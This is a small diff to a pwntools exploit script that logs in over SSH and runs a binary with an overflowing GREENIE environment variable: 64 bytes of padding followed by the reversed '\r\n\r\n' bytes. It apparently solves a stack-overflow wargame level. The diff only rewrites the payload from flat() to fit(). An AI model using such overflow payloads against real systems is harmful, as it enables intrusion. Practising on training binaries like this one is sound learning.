@@ -2,7 +2,7 @@ from pwn import *
 
 s = ssh(host=args.HOST, user=args.USER, password=args.PASS, port=int(args.SSH_PORT))
 
-payload = flat(['A'*64, '\r\n\r\n'[::-1]])
+payload = fit({64: '\r\n\r\n'[::-1]})
 
 p = s.system(args.BIN, env={'GREENIE': payload})
 
